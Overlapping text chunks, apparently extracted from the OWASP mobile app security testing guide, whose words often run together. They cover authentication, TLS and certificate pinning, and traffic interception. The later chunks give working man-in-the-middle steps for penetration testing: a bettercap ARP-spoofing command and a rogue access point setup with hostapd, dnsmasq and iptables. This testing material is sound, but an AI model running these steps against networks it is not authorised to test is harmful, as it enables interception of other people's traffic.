at least 6 digits. Makesurethatdigitsareseparatesinsmallergroupsincasepeoplehavetorememberthemtocopythemtoyour app. • AvoidVoicemail: Ifauserpreferstoreceiveaphonecall,donotleavetheOTPinformationasavoicemail. SMS-OTPResearch: • [#dmitrienko]Dmitrienko,Alexandra,etal.“Onthe(in)securityofmobiletwo-factorauthentication.” International ConferenceonFinancialCryptographyandDataSecurity. Springer,Berlin,Heidelberg,2014. • [#grassi] Grassi, Paul A., et al. Digital identity guidelines: Authentication and lifecycle management (DRAFT). No.SpecialPublication(NISTSP)-800-63B.2016. • [#grassi2]Grassi,PaulA.,etal.Digitalidentityguidelines: Authenticationandlifecyclemanagement. No.Special Publication(NISTSP)-800-63B.2017. • [#konoth]Konoth,RadheshKrishnan,VictorvanderVeen,andHerbertBos. “Howanywherecomputingjustkilled yourphone-basedtwo-factorauthentication.” InternationalConferenceonFinancialCryptographyandDataSecu- rity. Springer,Berlin,Heidelberg,2016. • [#mulliner]Mulliner,Collin,etal.“SMS-basedone-timepasswords: attacksanddefense.” InternationalConference onDetectionofIntrusionsandMalware,andVulnerabilityAssessment. Springer,Berlin,Heidelberg,2013. • [#siadati]Siadati,Hossein,etal.“MindyourSMSes: Mitigatingsocialengineeringinsecondfactorauthentication.” Computers&Security65(2017): 14-28. • [#siadati2]Siadati,Hossein,ToanNguyen,andNasirMemon. “Verificationcodeforwardingattack(shortpaper).” InternationalConferenceonPasswords. Springer,Cham,2015. Transaction Signing with Push Notifications and PKI Anotheralternativeandstrongmechanismstoimplementasecondfactoristransactionsigning. Transactionsigningrequiresauthenticationoftheuser’sapprovalofcriticaltransactions. Asymmetriccryptographyisthe bestwaytoimplementtransactionsigning. Theappwillgenerateapublic/privatekeypairwhentheusersignsup,then 57\\nregistersthepublickeyonthebackend. TheprivatekeyissecurelystoredintheKeyStore(Android)orKeyChain(iOS). To authorize a transaction, the backend sends the mobile app a push notification containing the transaction data. The useristhenaskedtoconfirmordenythetransaction. Afterconfirmation,theuserispromptedtounlocktheKeychain(by enteringthePINorfingerprint),andthedataissignedwithuser’sprivatekey. Thesignedtransactionisthensenttothe server,whichverifiesthesignaturewiththeuser’spublickey. Login Activity and Device Blocking Itisabestpracticethatappsshouldinformtheuseraboutallloginactivitieswithintheappwiththepossibilityofblocking certaindevices. Thiscanbebrokendownintovariousscenarios: 1. Theapplicationprovidesapushnotificationthemomenttheiraccountisusedonanotherdevicetonotifytheuser ofdifferentactivities. Theusercanthenblockthisdeviceafteropeningtheappviathepush-notification. 2. The application provides an overview of the last session",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 45
    }
  },
  {
    "text": "Asymmetriccryptographyisthe bestwaytoimplementtransactionsigning. Theappwillgenerateapublic/privatekeypairwhentheusersignsup,then 57\\nregistersthepublickeyonthebackend. TheprivatekeyissecurelystoredintheKeyStore(Android)orKeyChain(iOS). To authorize a transaction, the backend sends the mobile app a push notification containing the transaction data. The useristhenaskedtoconfirmordenythetransaction. Afterconfirmation,theuserispromptedtounlocktheKeychain(by enteringthePINorfingerprint),andthedataissignedwithuser’sprivatekey. Thesignedtransactionisthensenttothe server,whichverifiesthesignaturewiththeuser’spublickey. Login Activity and Device Blocking Itisabestpracticethatappsshouldinformtheuseraboutallloginactivitieswithintheappwiththepossibilityofblocking certaindevices. Thiscanbebrokendownintovariousscenarios: 1. Theapplicationprovidesapushnotificationthemomenttheiraccountisusedonanotherdevicetonotifytheuser ofdifferentactivities. Theusercanthenblockthisdeviceafteropeningtheappviathepush-notification. 2. The application provides an overview of the last session after login. If the previous session was with a different configuration(e.g.location,device,app-version)comparedtothecurrentconfiguration,thentheusershouldhave theoptiontoreportsuspiciousactivitiesandblockdevicesusedintheprevioussession. 3. Theapplicationprovidesanoverviewofthelastsessionafterloginatalltimes. 4. Theapplicationhasaself-serviceportalinwhichtheusercanseeanaudit-log. Thisallowstheusertomanagethe differentdevicesthatareloggedin. Thedevelopercanmakeuseofspecificmeta-informationandassociateittoeachdifferentactivityoreventwithinthe application. This will make it easier for the user to spot suspicious behavior and block the corresponding device. The meta-informationmayinclude: • Device: Theusercanclearlyidentifyalldeviceswheretheappisbeingused. • DateandTime: Theusercanclearlyseethelatestdateandtimewhentheappwasused. • Location: Theusercanclearlyidentifythelatestlocationswheretheappwasused. Theapplicationcanprovidealistofactivitieshistorywhichwillbeupdatedaftereachsensitiveactivitywithintheappli- cation. Thechoiceofwhichactivitiestoauditneedstobedoneforeachapplicationbasedonthedataithandlesandthe levelofsecurityrisktheteamiswillingtohave. Belowisalistofcommonsensitiveactivitiesthatareusuallyaudited: • Loginattempts • Passwordchanges • PersonalIdentifiableInformationchanges(name,emailaddress,telephonenumber,etc.) • Sensitiveactivities(purchase,accessingimportantresources,etc.) • ConsenttoTermsandConditionsclauses Paidcontentrequiresspecialcare, andadditionalmeta-information(e.g., operationcost, credit, etc.) mightbeusedto ensureuser’sknowledgeaboutthewholeoperation’sparameters. In addition, non-repudiation mechanisms should be applied to sensitive transactions (e.g. paid content access, given consenttoTermsandConditionsclauses,etc.) inordertoprovethataspecifictransactionwasinfactperformed(integrity) andbywhom(authentication). Lastly,itshouldbepossiblefortheusertologoutspecificopensessionsandinsomecasesitmightbeinterestingtofully blockcertaindevicesusingadeviceidentifier. 58\\nMobile App Network Communication Practicallyeverynetwork-connectedmobileappusestheHypertextTransferProtocol(HTTP)orHTTPoverTransportLayer Security (TLS), HTTPS, to send and receive data to and from remote endpoints. Consequently, network-based attacks (such as packet sniffing and man-in-the-middle-attacks) are a problem. In this chapter we discuss potential vulnera- bilities, testing techniques, and best practices concerning the network communication between mobile apps and their endpoints. Secure Connections The time has long passed since it was reasonable to use cleartext HTTP alone and it’s usually trivial to secure HTTP connectionsusingHTTPS.HTTPSisessentiallyHTTPlayeredontopofanotherprotocolknownasTransportLayerSecurity (TLS).AndTLSperformsahandshakeusingpublickeycryptographyand,whencomplete,createsasecureconnection. AnHTTPSconnectionisconsideredsecurebecauseofthreeproperties: • Confidentiality: TLSencryptsdatabeforesendingitoverthenetwork,whichmeansitcan’tbereadbyaninter- mediary. • Integrity: thedatacan’tbealteredwithoutdetection. • Authentication: theclientcanvalidatetheidentityoftheservertomakesuretheconnectionisestablishedwith thecorrectserver. Server Trust Evaluation CertificateAuthorities(CAs)areanintegralpartofasecureclientservercommunicationandtheyarepredefinedinthe truststoreofeachoperatingsystem. Forinstance,oniOStherearemorethan200rootcertificatesinstalled(seeApple documentation-AvailabletrustedrootcertificatesforAppleoperatingsystems) CAs can be added to the trust store, either manually by the user, by an MDM that manages the enterprise device or through malware. The question is then: “can you trust all of those CAs and should your app rely on the default trust store?”. Afterall,therearewell-knowncaseswherecertificateauthoritieshavebeencompromisedortrickedintoissuing certificatestoimpostors. AdetailedtimelineofCAbreachesandfailurescanbefoundatsslmate.com. BothAndroidandiOSallowtheusertoinstalladditionalCAsortrustanchors. AnappmaywanttotrustacustomsetofCAsinsteadoftheplatformdefault. Themostcommonreasonsforthisare: • Connectingtoahostwithacustomcertificateauthority(aCAthatisn’tknownortrustedbythesystemyet),such asaCAthatisself-signedorisissuedinternallywithinacompany. • LimitingthesetofCAstoaspecificlistoftrustedCAs. • TrustingadditionalCAsnotincludedinthesystem. About Trust Stores Extending Trust Whenevertheappconnectstoaserverwhosecertificateisself-signedorunknowntothesystem,thesecureconnection willfail. ThisistypicallythecaseforanynonpublicCAs,forinstancethoseissuedbyanorganizationsuchasagovernment, corporation,oreducationinstitutionfortheirownuse. BothAndroidandiOSoffermeanstoextendtrust,i.e.includeadditionalCAssothattheapptruststhesystem’sbuilt-in onesplusthecustomones. However,rememberthatthedeviceusersarealwaysabletoincludeadditionalCAs. Therefore,dependingonthethreat modeloftheappitmightbenecessarytoavoidtrustinganycertificatesaddedtotheusertruststoreorevengofurther andonlytrustapre-definedspecificcertificateorsetofcertificates. Formanyapps,the“defaultbehavior”providedbythemobileplatformwillbesecureenoughfortheirusecase(intherare casethatasystem-trustedCAiscompromisedthedatahandledbytheappisnotconsideredsensitiveorothersecurity 59\\nmeasuresaretakenwhichareresilienteventosuchaCAbreach). However, forotherappssuchasfinancialorhealth apps,theriskofaCAbreach,evenifrare,mustbeconsidered. Restricting Trust: Identity Pinning SomeappsmightneedtofurtherincreasetheirsecuritybyrestrictingthenumberofCAsthattheytrust. Typicallyonly theCAswhichareusedbythedeveloperareexplicitlytrusted,whiledisregardingallothers. Thistrustrestrictionisknown asIdentityPinningusuallyimplementedasCertificatePinningorPublicKeyPinning. IntheOWASPMASTGwewillbereferringtothistermas“IdentityPinning”,“CertificatePinning”,“PublicKeyPinning” orsimply“Pinning”. Pinningistheprocessofassociatingaremoteendpointwithaparticularidentity,suchasaX.509certificateorpublickey, insteadofacceptinganycertificatesignedbyatrustedCA.Afterpinningtheserveridentity(oracertainset,aka. pinset), themobileappwillsubsequentlyconnecttothoseremoteendpointsonlyiftheidentitymatches. Withdrawingtrustfrom unnecessaryCAsreducestheapp’sattacksurface. General Guidelines TheOWASPCertificatePinningCheatSheetgivesessentialguidanceon: • whenpinningisrecommendedandwhichexceptionsmightapply. • whentopin: developmenttime(preloading)oruponfirstencountering(trustonfirstuse). • whattopin: certificate,publickeyorhash. BothAndroidandiOSrecommendationsmatchthe“bestcase”whichis: • Pinonlytoremoteendpointswherethedeveloperhascontrol. • atdevelopmenttimevia(NSC/ATS) • pinahashoftheSPKIsubjectPublicKeyInfo. Pinninghasgainedabadreputationsinceitsintroductionseveralyearsago. We’dliketoclarifyacoupleofpointsthat arevalidatleastformobileapplicationsecurity: • The bad reputation is due to operational reasons (e.g. implementation/pin management complexity) not lack of security. • Ifanappdoesnotimplementpinning,thisshouldn’tbereportedasavulnerability. However,iftheappmustverify againstMASVS-L2itmustbeimplemented. • BothAndroidandiOSmakeimplementingpinningveryeasyandfollowthebestpractices. • PinningprotectsagainstacompromisedCAoramaliciousCAthatisinstalledonthedevice. Inthosecases,pinning willpreventtheOSfromestablishingasecureconnectionfrombeingestablishedwithamaliciousserver. However, ifanattackerisincontrolofthedevice,theycaneasilydisableanypinninglogicandthusstillallowtheconnection to happen. As a result, this will not prevent an attacker from accessing your backend and abusing server-side vulnerabilities. • Pinning in mobile apps is not the same as HTTP Public Key Pinning (HPKP). The HPKP header is no longer recom- mendedonwebsitesasitcanleadtousersbeinglockedoutofthewebsitewithoutanywaytorevertthelockout. For mobile apps, this is not an issue, as the app can always be updated via an out-of-band channel (i.e. the app store)incasethereareanyissues. About Pinning Recommendations in Android Developers TheAndroidDeveloperssiteincludesthefollowingwarning: Caution: CertificatePinningisnotrecommendedforAndroidapplicationsduetothehighriskoffutureservercon- figurationchanges,suchaschangingtoanotherCertificateAuthority,renderingtheapplicationunabletoconnect totheserverwithoutreceivingaclientsoftwareupdate. Theyalsoincludethisnote: 60\\nNotethat,whenusingcertificatepinning,youshouldalwaysincludeabackupkeysothatifyouareforcedtoswitch tonewkeysorchangeCAs(whenpinningtoaCAcertificateoranintermediateofthatCA),yourapp’sconnectivity isunaffected. Otherwise,youmustpushoutanupdatetotheapptorestoreconnectivity. Thefirststatementcanbemistakenlyinterpretedassayingthatthey“donotrecommendcertificatepinning”. Thesecond statement clarifies this: the actual recommendation is that if developers want to implement pinning they have to take thenecessaryprecautions. About Pinning Recommendations in Apple Developers Applerecommendsthinkinglong-termandcreatingaproperserverauthenticationstrategy. OWASP MASTG Recommendation Pinningisarecommendedpractice,especiallyforMASVS-L2apps. However,developersmustimplementitexclusively fortheendpointsundertheircontrolandbesuretoincludebackupkeys(aka. backuppins)andhaveaproperappupdate strategy.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 46
    }
  },
  {
    "text": "Recommendations in Android Developers TheAndroidDeveloperssiteincludesthefollowingwarning: Caution: CertificatePinningisnotrecommendedforAndroidapplicationsduetothehighriskoffutureservercon- figurationchanges,suchaschangingtoanotherCertificateAuthority,renderingtheapplicationunabletoconnect totheserverwithoutreceivingaclientsoftwareupdate. Theyalsoincludethisnote: 60\\nNotethat,whenusingcertificatepinning,youshouldalwaysincludeabackupkeysothatifyouareforcedtoswitch tonewkeysorchangeCAs(whenpinningtoaCAcertificateoranintermediateofthatCA),yourapp’sconnectivity isunaffected. Otherwise,youmustpushoutanupdatetotheapptorestoreconnectivity. Thefirststatementcanbemistakenlyinterpretedassayingthatthey“donotrecommendcertificatepinning”. Thesecond statement clarifies this: the actual recommendation is that if developers want to implement pinning they have to take thenecessaryprecautions. About Pinning Recommendations in Apple Developers Applerecommendsthinkinglong-termandcreatingaproperserverauthenticationstrategy. OWASP MASTG Recommendation Pinningisarecommendedpractice,especiallyforMASVS-L2apps. However,developersmustimplementitexclusively fortheendpointsundertheircontrolandbesuretoincludebackupkeys(aka. backuppins)andhaveaproperappupdate strategy. Learn more • “AndroidSecurity: SSLPinning” • OWASPCertificatePinningCheatSheet Verifying the TLS Settings Oneofthecoremobileappfunctionsissending/receivingdataoveruntrustednetworksliketheInternet. Ifthedatais notproperlyprotectedintransit, anattackerwithaccesstoanypartofthenetworkinfrastructure(e.g., aWi-Fiaccess point)mayintercept,read,ormodifyit. Thisiswhyplaintextnetworkprotocolsarerarelyadvisable. ThevastmajorityofappsrelyonHTTPforcommunicationwiththebackend. HTTPSwrapsHTTPinanencryptedconnection (theacronymHTTPSoriginallyreferredtoHTTPoverSecureSocketLayer(SSL);SSListhedeprecatedpredecessorofTLS). TLSallowsauthenticationofthebackendserviceandensuresconfidentialityandintegrityofthenetworkdata. Recommended TLS Settings EnsuringproperTLSconfigurationontheserversideisalsoimportant. TheSSLprotocolisdeprecatedandshouldnolonger beused. AlsoTLSv1.0andTLSv1.1haveknownvulnerabilitiesandtheirusageisdeprecatedinallmajorbrowsersby 2020. TLSv1.2andTLSv1.3areconsideredbestpracticeforsecuretransmissionofdata. StartingwithAndroid10(API level 29) TLS v1.3 will be enabled by default for faster and secure communication. The major change with TLS v1.3 is thatcustomizingciphersuitesisnolongerpossibleandthatallofthemareenabledwhenTLSv1.3isenabled,whereas ZeroRoundTrip(0-RTT)modeisn’tsupported. When both the client and server are controlled by the same organization and used only for communicating with one another,youcanincreasesecuritybyhardeningtheconfiguration. If a mobile application connects to a specific server, its networking stack can be tuned to ensure the highest possible security level for the server’s configuration. Lack of support in the underlying operating system may force the mobile applicationtouseaweakerconfiguration. Cipher Suites Terminology Ciphersuiteshavethefollowingstructure: Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_IntegrityCheckAlgorithm Thisstructureincludes: 61\\n• AProtocolusedbythecipher • AKeyExchangeAlgorithmusedbytheserverandtheclienttoauthenticateduringtheTLShandshake • ABlockCipherusedtoencryptthemessagestream • AIntegrityCheckAlgorithmusedtoauthenticatemessages Example: TLS_RSA_WITH_3DES_EDE_CBC_SHA Intheexampleabovetheciphersuitesuses: • TLSasprotocol • RSAAsymmetricencryptionforAuthentication • 3DESforSymmetricencryptionwithEDE_CBCmode • SHAHashalgorithmforintegrity NotethatinTLSv1.3theKeyExchangeAlgorithmisnotpartoftheciphersuite,insteaditisdeterminedduringtheTLS handshake. Inthefollowinglisting,we’llpresentthedifferentalgorithmsofeachpartoftheciphersuite. Protocols: • SSLv1 • SSLv2-RFC6176 • SSLv3-RFC6101 • TLSv1.0-RFC2246 • TLSv1.1-RFC4346 • TLSv1.2-RFC5246 • TLSv1.3-RFC8446 KeyExchangeAlgorithms: • DSA-RFC6979 • ECDSA-RFC6979 • RSA-RFC8017 • DHE-RFC2631-RFC7919 • ECDHE-RFC4492 • PSK-RFC4279 • DSS-FIPS186-4 • DH_anon-RFC2631-RFC7919 • DHE_RSA-RFC2631-RFC7919 • DHE_DSS-RFC2631-RFC7919 • ECDHE_ECDSA-RFC8422 • ECDHE_PSK-RFC8422-RFC5489 • ECDHE_RSA-RFC8422 BlockCiphers: • DES-RFC4772 • DES_CBC-RFC1829 • 3DES-RFC2420 • 3DES_EDE_CBC-RFC2420 • AES_128_CBC-RFC3268 • AES_128_GCM-RFC5288 • AES_256_CBC-RFC3268 • AES_256_GCM-RFC5288 • RC4_40-RFC7465 • RC4_128-RFC7465 • CHACHA20_POLY1305-RFC7905-RFC7539 IntegrityCheckAlgorithms: • MD5-RFC6151 • SHA-RFC6234 • SHA256-RFC6234 62\\n• SHA384-RFC6234 Notethattheefficiencyofaciphersuitedependsontheefficiencyofitsalgorithms. ThefollowingresourcescontainthelatestrecommendedciphersuitestousewithTLS: • IANArecommendedciphersuitescanbefoundinTLSCipherSuites. • OWASPrecommendedciphersuitescanbefoundintheTLSCipherStringCheatSheet. SomeAndroidandiOSversionsdonotsupportsomeoftherecommendedciphersuites,soforcompatibilitypurposesyou cancheckthesupportedciphersuitesforAndroidandiOSversionsandchoosethetopsupportedciphersuites. Ifyouwanttoverifywhetheryourserversupportstherightciphersuites,therearevarioustoolsyoucanuse: • nscurl-seeiOSNetworkCommunicationformoredetails. • testssl.shwhich“isafreecommandlinetoolwhichchecksaserver’sserviceonanyportforthesupportofTLS/SSL ciphers,protocolsaswellassomecryptographicflaws”. Finally,verifythattheserverorterminationproxyatwhichtheHTTPSconnectionterminatesisconfiguredaccordingto best practices. See also the OWASP Transport Layer Protection cheat sheet and the Qualys SSL/TLS Deployment Best Practices. Intercepting HTTP(S) Traffic Inmanycases,itismostpracticaltoconfigureasystemproxyonthemobiledevice,sothatHTTP(S)trafficisredirected throughaninterceptionproxyrunningonyourhostcomputer. Bymonitoringtherequestsbetweenthemobileappclient and the backend, you can easily map the available server-side APIs and gain insight into the communication protocol. Additionally,youcanreplayandmanipulaterequeststotestforserver-sidevulnerabilities. Severalfreeandcommercialproxytoolsareavailable. Herearesomeofthemostpopular: • BurpSuite • OWASPZAP Tousetheinterceptionproxy,you’llneedtorunitonyourhostcomputerandconfigurethemobileapptorouteHTTP(S) requeststoyourproxy. Inmostcases,itisenoughtosetasystem-wideproxyinthenetworksettingsofthemobiledevice -iftheappusesstandardHTTPAPIsorpopularlibrariessuchasokhttp,itwillautomaticallyusethesystemsettings. UsingaproxybreaksSSLcertificateverificationandtheappwillusuallyfailtoinitiateTLSconnections. Toworkaround thisissue,youcaninstallyourproxy’sCAcertificateonthedevice. We’llexplainhowtodothisintheOS-specific“Basic SecurityTesting”chapters. 63\\nIntercepting Non-HTTP Traffic InterceptionproxiessuchasBurpandOWASPZAPwon’tshownon-HTTPtraffic,becausetheyaren’tcapableofdecoding itproperlybydefault. Thereare,however,Burppluginsavailablesuchas: • Burp-non-HTTP-Extensionand • Mitm-relay. Thesepluginscanvisualizenon-HTTPprotocolsandyouwillalsobeabletointerceptandmanipulatethetraffic. NotethatthissetupcansometimesbecomeverytediousandisnotasstraightforwardastestingHTTP. Intercepting Traffic from the App Process Dependingonyourgoalwhiletestingtheapp,sometimesitisenoughtomonitorthetrafficbeforeitreachesthenetwork layerorwhentheresponsesarereceivedintheapp. Youdon’tneedtodeployafullyfledgedMITMattackifyousimplywanttoknowifacertainpieceofsensitivedataisbeing transmittedtothenetwork. Inthiscaseyouwouldn’tevenhavetobypasspinning,ifimplemented. Youjusthavetohook therightfunctions,e.g.SSL_writeandSSL_readfromopenssl. This would work pretty well for apps using standard API libraries functions and classes, however there might be some downsides: • theappmightimplementacustomnetworkstackandyou’llhavetospendtimeanalyzingtheapptofindoutthe APIsthatyoucanuse. Seesection“SearchingforOpenSSLtraceswithsignatureanalysis”inthisblogpost. • itmightbeverytimeconsumingtocrafttherighthookingscriptstore-assembleHTTPresponsepairs(acrossmany methodcallsandexecutionthreads). Youmightfindready-madescriptsandevenforalternativenetworkstacks butdependingontheappandtheplatformthesescriptsmightneedalotofmaintenanceandmightnotalways work. Seesomeexamples: • “Universal interception. How to bypass SSL Pinning and monitor traffic of any application”, sections “Grabbing payloadpriortotransmission”and“Grabbingpayloadpriortoencryption” • “FridaasanAlternativetoNetworkTracing” ThistechniqueisalsousefulforothertypesoftrafficsuchasBLE,NFC,etc. wheredeployingaMITMattackmight beverycostlyandorcomplex. Intercepting Traffic on the Network Layer Dynamicanalysisbyusinganinterceptionproxycanbestraightforwardifstandardlibrariesareusedintheappandall communicationisdoneviaHTTP.Butthereareseveralcaseswherethisisnotworking: • IfmobileapplicationdevelopmentplatformslikeXamarinareusedthatignorethesystemproxysettings; • Ifmobileapplicationsverifyifthesystemproxyisusedandrefusetosendrequeststhroughaproxy; • Ifyouwanttointerceptpushnotifications,likeforexampleGCM/FCMonAndroid; • IfXMPPorothernon-HTTPprotocolsareused. Inthesecasesyouneedtomonitorandanalyzethenetworktrafficfirstinordertodecidewhattodonext. Luckily,there areseveraloptionsforredirectingandinterceptingnetworkcommunication: • Routethetrafficthroughthehostcomputer. Youcansetuphostcomputerasthenetworkgateway,e.g.byusing thebuilt-inInternetSharingfacilitiesofyouroperatingsystem. YoucanthenuseWiresharktosniffanytrafficfrom themobiledevice. • Sometimes you need to execute a MITM attack to force the mobile device to talk to you. For this scenario you shouldconsiderbettercaporuseyourownaccesspointtoredirectnetworktrafficfromthemobiledevicetoyour hostcomputer(seebelow). 64\\n• Onarooteddevice,youcanusehookingorcodeinjectiontointerceptnetwork-relatedAPIcalls(e.g.HTTPrequests) anddumporevenmanipulatetheargumentsofthesecalls. Thiseliminatestheneedtoinspecttheactualnetwork data. We’lltalkinmoredetailaboutthesetechniquesinthe“ReverseEngineeringandTampering”chapters. • OnmacOS,youcancreatea“RemoteVirtualInterface”forsniffingalltrafficonaniOSdevice. We’lldescribethis methodinthechapter“BasicSecurityTestingoniOS”. Simulating a Man-in-the-Middle Attack with bettercap Network Setup Tobeabletogetaman-in-the-middlepositionyourhostcomputershouldbeinthesamewirelessnetworkasthemobile phoneandthegatewayitcommunicatesto. OncethisisdoneyouneedtheIPaddressofyourmobilephone. Forafull dynamicanalysisofamobileapp,allnetworktrafficshouldbeintercepted. MITM Attack Start your preferred network analyzer tool first, then start",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 47
    }
  },
  {
    "text": "attack to force the mobile device to talk to you. For this scenario you shouldconsiderbettercaporuseyourownaccesspointtoredirectnetworktrafficfromthemobiledevicetoyour hostcomputer(seebelow). 64\\n• Onarooteddevice,youcanusehookingorcodeinjectiontointerceptnetwork-relatedAPIcalls(e.g.HTTPrequests) anddumporevenmanipulatetheargumentsofthesecalls. Thiseliminatestheneedtoinspecttheactualnetwork data. We’lltalkinmoredetailaboutthesetechniquesinthe“ReverseEngineeringandTampering”chapters. • OnmacOS,youcancreatea“RemoteVirtualInterface”forsniffingalltrafficonaniOSdevice. We’lldescribethis methodinthechapter“BasicSecurityTestingoniOS”. Simulating a Man-in-the-Middle Attack with bettercap Network Setup Tobeabletogetaman-in-the-middlepositionyourhostcomputershouldbeinthesamewirelessnetworkasthemobile phoneandthegatewayitcommunicatesto. OncethisisdoneyouneedtheIPaddressofyourmobilephone. Forafull dynamicanalysisofamobileapp,allnetworktrafficshouldbeintercepted. MITM Attack Start your preferred network analyzer tool first, then start bettercap with the following command and replace the IP addressbelow(X.X.X.X)withthetargetyouwanttoexecutetheMITMattackagainst. $sudobettercap -eval \"setarp.spoof.targetsX.X.X.X;arp.spoofon;setarp.spoof.internaltrue;setarp.spoof.fullduplextrue;\" bettercapv2.22 (builtfordarwinamd64withgo1.12.1)[type 'help' foralistofcommands] [19:21:39] [sys.log][inf]arp.spoofenablingforwarding [19:21:39] [sys.log][inf]arp.spoofarpspooferstarted,probing1targets. bettercapwillthenautomaticallysendthepacketstothenetworkgatewayinthe(wireless)networkandyouareableto sniffthetraffic. Beginningof2019supportforfullduplexARPspoofingwasaddedtobettercap. On the mobile phone start the browser and navigate tohttp://example.com, you should see output like the following whenyouareusingWireshark. Ifthat’sthecase,youarenowabletoseethecompletenetworktrafficthatissentandreceivedbythemobilephone. This includesalsoDNS,DHCPandanyotherformofcommunicationandcanthereforebequite“noisy”. Youshouldtherefore knowhowtouseDisplayFiltersinWiresharkorknowhowtofilterintcpdumptofocusonlyontherelevanttrafficforyou. Man-in-the-middleattacksworkagainstanydeviceandoperatingsystemastheattackisexecutedonOSILayer2 throughARPSpoofing. WhenyouareMITMyoumightnotbeabletoseecleartextdata,asthedataintransitmight be encrypted by using TLS, but it will give you valuable information about the hosts involved, the protocols used andtheportstheappiscommunicatingwith. 65\\nSimulating a Man-in-the-Middle Attack with an access point Network Setup A simple way to simulate a man-in-the-middle (MITM) attack is to configure a network where all packets between the devicesinscopeandthetargetnetworkaregoingthroughyourhostcomputer. Inamobilepenetrationtest,thiscanbe achievedbyusinganaccesspointthemobiledevicesandyourhostcomputerareconnectedto. Yourhostcomputeris thenbecomingarouterandanaccesspoint. Followingscenariosarepossible: • Use your host computer’s built-in WiFi card as an access point and use your wired connection to connect to the targetnetwork. • UseanexternalUSBWiFicardasanaccesspointanduseyourhostcomputer’sbuilt-inWiFitoconnecttothetarget network(canbevice-versa). • Useaseparateaccesspointandredirectthetraffictoyourhostcomputer. ThescenariowithanexternalUSBWiFicardrequirethatthecardhasthecapabilitytocreateanaccesspoint. Additionally, youneedtoinstallsometoolsand/orconfigurethenetworktoenforceaman-in-the-middleposition(seebelow). Youcan verifyifyourWiFicardhasAPcapabilitiesbyusingthecommandiwconfigonKaliLinux: iwlist |grep AP ThescenariowithaseparateaccesspointrequiresaccesstotheconfigurationoftheAPandyoushouldcheckfirstifthe APsupportseither: • portforwardingor • hasaspanormirrorport. InbothcasestheAPneedstobeconfiguredtopointtoyourhostcomputer’sIP.Yourhostcomputermustbeconnectedto theAP(viawiredconnectionorWiFi)andyouneedtohaveconnectiontothetargetnetwork(canbethesameconnection astotheAP).Someadditionalconfigurationmayberequiredonyourhostcomputertoroutetraffictothetargetnetwork. Iftheseparateaccesspointbelongstothecustomer,allchangesandconfigurationsshouldbeclarifiedpriortothe engagementandabackupshouldbecreated,beforemakinganychanges. Installation Thefollowingprocedureissettingupaman-in-the-middlepositionusinganaccesspointandanadditionalnetworkinter- face: CreateaWiFinetworkeitherthroughaseparateaccesspointorthroughanexternalUSBWiFicardorthroughthebuilt-in cardofyourhostcomputer. 66\\nThiscanbedonebyusingthebuilt-inutilitiesonmacOS.YoucanusesharetheinternetconnectiononMacwithother networkusers. ForallmajorLinuxandUnixoperatingsystemsyouneedtoolssuchas: • hostapd • dnsmasq • iptables • wpa_supplicant • airmon-ng ForKaliLinuxyoucaninstallthesetoolswithapt-get: apt-getupdate apt-getinstallhostapddnsmasqaircrack-ng iptablesandwpa_supplicantareinstalledbydefaultonKaliLinux. Incaseofaseparateaccesspoint,routethetraffictoyourhostcomputer. IncaseofanexternalUSBWiFicardorbuilt-in WiFicardthetrafficisalreadyavailableonyourhostcomputer. RoutetheincomingtrafficcomingfromtheWiFitotheadditionalnetworkinterfacewherethetrafficcanreachthetarget network. AdditionalnetworkinterfacecanbewiredconnectionorotherWiFicard,dependingonyoursetup. Configuration WefocusontheconfigurationfilesforKaliLinux. Followingvaluesneedtobedefined: • wlan1-idoftheAPnetworkinterface(withAPcapabilities), • wlan0-idofthetargetnetworkinterface(thiscanbewiredinterfaceorotherWiFicard) • 10.0.0.0/24-IPaddressesandmaskofAPnetwork Thefollowingconfigurationfilesneedtobechangedandadjustedaccordingly: • hostapd.conf #Name oftheWiFiinterfaceweuse interface=wlan1 #Use thenl80211driver driver=nl80211 hw_mode=g channel=6 wmm_enabled=1 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_key_mgmt=WPA-PSK rsn_pairwise=CCMP #Name oftheAPnetwork ssid=STM-AP #Password oftheAPnetwork wpa_passphrase=password • wpa_supplicant.conf network={ ssid=\"NAME_OF_THE_TARGET_NETWORK\" psk=\"PASSWORD_OF_THE_TARGET_NETWORK\" } • dnsmasq.conf interface=wlan1 dhcp-range=10.0.0.10,10.0.0.250,12h dhcp-option=3,10.0.0.1 dhcp-option=6,10.0.0.1 server=8.8.8.8 log-queries log-dhcp listen-address=127.0.0.1 67\\nMITM Attack Tobeabletogetaman-in-the-middlepositionyouneedtoruntheaboveconfiguration. Thiscanbedonebyusingthe followingcommandsonKaliLinux: #checkifotherprocessisnotusingWiFiinterfaces $airmon-ngcheckkill #configureIPaddressoftheAPnetworkinterface $ifconfigwlan110.0.0.1up #startaccesspoint $hostapdhostapd.conf #connectthetargetnetworkinterface $wpa_supplicant -B-iwlan0 -cwpa_supplicant.conf #runDNSserver $dnsmasq -Cdnsmasq.conf -d #enablerouting $echo1 >/proc/sys/net/ipv4/ip_forward #iptableswillNATconnectionsfromAPnetworkinterfacetothetargetnetworkinterface $iptables --flush $iptables --table nat--append POSTROUTING --out-interface wlan0 -jMASQUERADE $iptables --append FORWARD --in-interface wlan1 -jACCEPT $iptables -tnat-APOSTROUTING -jMASQUERADE Nowyoucanconnectyourmobiledevicestotheaccesspoint. Network Analyzer Tool Installatoolthatallowsyoutomonitorandanalyzethenetworktrafficthatwillberedirectedtoyourhostcomputer. The twomostcommonnetworkmonitoring(orcapturing)toolsare: • Wireshark(CLIpendant: TShark) • tcpdump Wireshark offers a GUI and is more straightforward if you are not used to the command line. If you are looking for a commandlinetoolyoushouldeitheruseTSharkortcpdump. AllofthesetoolsareavailableforallmajorLinuxandUnix operatingsystemsandshouldbepartoftheirrespectivepackageinstallationmechanisms. Setting a Proxy Through Runtime Instrumentation Onarootedorjailbrokendevice, youcanalsouseruntimehookingtosetanewproxyorredirectnetworktraffic. This canbeachievedwithhookingtoolslikeInspeckageorcodeinjectionframeworkslikeFridaandcycript. You’llfindmore informationaboutruntimeinstrumentationinthe“ReverseEngineeringandTampering”chaptersofthisguide. Example - Dealing with Xamarin Asanexample,wewillnowredirectallrequestsfromaXamarinapptoaninterceptionproxy. 